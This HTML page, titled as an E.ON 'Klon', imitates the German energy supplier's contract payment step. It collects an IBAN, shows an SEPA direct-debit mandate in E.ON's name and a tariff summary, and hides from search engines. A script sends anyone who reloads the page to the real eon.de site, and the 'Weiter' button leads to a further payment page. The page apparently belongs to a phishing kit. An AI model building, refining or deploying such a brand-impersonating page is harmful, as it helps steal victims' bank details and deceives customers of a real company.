<!DOCTYPE html>
<html lang="de">
<head>
    <meta name="robots" content="noindex, nofollow">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Zahlungsweise - E.ON Klon</title>
    <!-- Tailwind CSS and Google Fonts -->
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Inter', sans-serif; background-color: #f7f7f7; }
        .info-icon { display: inline-flex; align-items: center; justify-content: center; width: 1.25rem; height: 1.25rem; border: 1.5px solid #9ca3af; border-radius: 50%; color: #9ca3af; font-size: 0.75rem; font-weight: bold; cursor: pointer; }
        .progress-step { display: flex; flex-direction: column; align-items: center; position: relative; }
        .progress-step .circle { width: 3rem; height: 3rem; border-radius: 50%; display: flex; align-items: center; justify-content: center; border: 2px solid #d1d5db; background-color: white; z-index: 1; }
        .progress-step.active .circle { border-color: #111827; background-color: #111827; color: white; }
        .progress-step.completed .circle { border-color: #111827; background-color: #111827; color: white; }
        .progress-line { height: 2px; background-color: #d1d5db; width: 100%; position: absolute; top: 1.5rem; transform: translateY(-50%); }
    </style>
</head>
<body class="text-gray-800">

    <!-- Header -->
    <header class="bg-white border-b">
        <div class="container mx-auto px-4 sm:px-6 lg:px-8 flex justify-between items-center h-20">
            <img src="logo.png" alt="E.ON Logo" class="h-8">
            <!-- Icons can be added here if needed -->
        </div>
    </header>

    <!-- Main Content -->
    <main class="container mx-auto px-4 sm:px-6 lg:px-8 py-12">
        <!-- Progress Bar would go here if needed -->

        <div class="grid grid-cols-1 lg:grid-cols-3 gap-8">
            <!-- Left Column: Form -->
            <div class="lg:col-span-2 space-y-8">
                
                <!-- Section 3: Payment Method -->
                <section class="bg-white p-8 rounded-lg shadow-sm border">
                    <!-- EDITED THIS LINE -->
                    <h2 class="text-2xl font-bold mb-4">2/2 Zahlungsweise</h2>
                    <p class="text-gray-600 mb-4">Zahlen Sie bequem per SEPA-Lastschriftmandat oder Überweisung. Sie brauchen sich um nichts zu kümmern. Wenn Sie per Überweisung bezahlen möchten, dann klicken Sie bitte auf "Weiter".</p>
                    <p class="text-sm text-gray-700 font-semibold mb-6 flex items-center">
                        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 mr-2 text-gray-500" viewBox="0 0 20 20" fill="currentColor"><path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clip-rule="evenodd" /></svg>
                        Die Übertragung Ihrer Daten erfolgt verschlüsselt über einen Sicherheitsserver. Eine Abrechnung erfolgt nur, wenn der Vertrag zustande kommt.
                    </p>
                    
                    <div class="space-y-6">
                        <div class="flex items-center border border-gray-400 rounded-md p-3 focus-within:border-red-500 focus-within:ring-1 focus-within:ring-red-500">
                            <input type="text" id="iban" placeholder="IBAN" class="flex-grow outline-none bg-transparent" maxlength="27"> <!-- Maxlength is 22 chars + 5 spaces -->
                            <span class="info-icon">i</span>
                        </div>
                        <div>
                            <input type="text" id="bank-name" placeholder="Name der Bank (wird automatisch ausgefüllt)" class="w-full p-3 border border-gray-300 rounded-md bg-gray-100" disabled>
                        </div>
                        <div>
                            <label class="flex items-start text-sm">
                                <input type="checkbox" id="sepa-mandate" class="h-4 w-4 mt-1 rounded border-gray-300 text-red-600 focus:ring-red-500">
                                <span class="ml-3 text-gray-700">Ich ermächtige hiermit E.ON Energie Deutschland GmbH, Zahlungen von meinem Konto mittels Lastschrift einzuziehen. Zugleich weise ich mein Kreditinstitut an, die von E.ON Energie Deutschland GmbH auf mein Konto gezogenen Lastschriften einzulösen. Die Referenznummer für Ihr SEPA-Mandat teilen wir Ihnen separat mit. <br><strong class="mt-2 block">Hinweis:</strong> Ich kann innerhalb von acht Wochen, beginnend mit dem Belastungsdatum, die Erstattung des belasteten Betrages verlangen. Es gelten dabei die mit meinem Kreditinstitut vereinbarten Bedingungen.</span>
                            </label>
                        </div>
                    </div>

                    <div class="mt-8">
                        <a href="final_payment.html" class="inline-block w-auto bg-red-600 text-white font-bold py-3 px-8 rounded-md hover:bg-red-700 transition duration-200">Weiter</a>
                    </div>
                </section>

                <!-- I HAVE REMOVED THE OTHER COLLAPSED SECTIONS FROM HERE -->

            </div>

            <!-- Right Column: Tariff Summary -->
            <aside class="lg:col-span-1">
                <div class="bg-white p-6 rounded-lg shadow-sm border sticky top-12">
                    <!-- The tariff summary code from previous pages goes here -->
                    <h3 class="text-xl font-bold mb-4">Tolle Wahl – Ihr Tarif:</h3>
                    <h4 class="text-2xl font-bold mb-2">E.ON Klar ÖkoStrom 18</h4>
                    <div class="bg-purple-800 text-white p-3 rounded-md text-sm font-semibold mb-4">
                        Neukundenbonus: 278 €<br>On Top Bonus: 10 € <span class="info-icon border-white text-white">i</span>
                    </div>
                    <p class="text-4xl font-bold mb-1">60,67 € <span class="info-icon">i</span></p>
                    <p class="text-xs text-gray-500 mb-4">inkl. Bonus pro Monat im 1. Jahr, gesamt im 1. Jahr: 728,09 € / 84,66 € Abschlag exkl. Bonus</p>
                    <div class="border-t border-b border-gray-200 py-4 my-4">
                        <h5 class="font-bold mb-2">Preisdetails</h5>
                        <ul class="space-y-2 text-sm">
                            <li class="flex justify-between items-start"><span class="flex items-center"><svg class="h-4 w-4 text-red-600 mr-2" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7" /></svg>Preisgarantie bis zum 31.03.2027</span><span class="info-icon">i</span></li>
                            <li class="flex justify-between items-start"><span class="flex items-center"><svg class="h-4 w-4 text-red-600 mr-2" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7" /></svg>18 Monate Mindestvertragslaufzeit</span></li>
                            <li class="flex justify-between items-start"><span class="flex items-center"><svg class="h-4 w-4 text-red-600 mr-2" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7" /></svg>100% Ökostrom aus deutscher Erzeugung</span><span class="info-icon">i</span></li>
                        </ul>
                    </div>
                    <h5 class="font-bold mb-2">Preisgarantie verlängern</h5>
                    <label class="flex items-start text-sm">
                        <input type="checkbox" class="h-4 w-4 mt-1 rounded border-gray-300 text-red-600 focus:ring-red-500">
                        <span class="ml-2 text-gray-700">Zum E.ON Klar ÖkoStrom 24 wechseln<br>24 Monate Preisgarantie und Mindestvertragslaufzeit für 61,84 € pro Monat inkl. Bonus</span>
                        <span class="info-icon ml-auto mt-1">i</span>
                    </label>
                </div>
            </aside>
        </div>
    </main>

    <!-- Footer -->
    <footer class="bg-white border-t mt-12">
        <div class="container mx-auto px-4 sm:px-6 lg:px-8 flex flex-col sm:flex-row justify-between items-center py-6 text-sm text-gray-600">
            <p class="mb-4 sm:mb-0">&copy; 2025 E.ON Energie Deutschland GmbH</p>
            <div class="flex flex-wrap justify-center space-x-4 mb-4 sm:mb-0">
                <a href="#" class="hover:underline">Impressum</a>
                <a href="#" class="hover:underline">Datenschutz</a>
                <a href="#" class="hover:underline">AGB</a>
                <a href="#" class="hover:underline">Rechtliche Hinweise</a>
                <a href="#" class="hover:underline">Cookies</a>
                <a href="#" class="hover:underline">Erklärung zur Barrierefreiheit</a>
                <a href="#" class="hover:underline">Barriere melden</a>
            </div>
            <div class="flex items-center space-x-4">
                 <img src="logo.png" alt="E.ON Logo" class="h-8 hidden sm:block">
                 <!-- Social Icons can be added here -->
            </div>
        </div>
    </footer>

    <script>
        document.addEventListener('DOMContentLoaded', () => {
            const ibanInput = document.getElementById('iban');
            const bankNameInput = document.getElementById('bank-name');

            const bankDirectory = {
                '10070000': 'Deutsche Bank',
                '20040000': 'Commerzbank',
                '70022200': 'HypoVereinsbank (UniCredit Bank)',
                '50010517': 'ING-DiBa',
                '10010010': 'Postbank',
                '10050000': 'Berliner Sparkasse',
                '70150000': 'Stadtsparkasse München'
            };

            ibanInput.addEventListener('input', (e) => {
                let value = e.target.value;
                let sanitizedValue = value.replace(/[^a-zA-Z0-9]/g, '').toUpperCase();
                let trimmedValue = sanitizedValue.substring(0, 22);
                let formattedValue = (trimmedValue.match(/.{1,4}/g) || []).join(' ');
                e.target.value = formattedValue;
                const potentialBlz = sanitizedValue.substring(4, 12);
                if (potentialBlz && bankDirectory[potentialBlz]) {
                    bankNameInput.value = bankDirectory[potentialBlz];
                } else {
                    bankNameInput.value = '';
                }
            });
        });
    </script>
    <script>
      // Modern API to detect reload
      if (performance.getEntriesByType("navigation")[0].type === "reload") {
          window.location.href = "https://www.eon.de/de/pk.html";
      }
    </script>

</body>
</html>
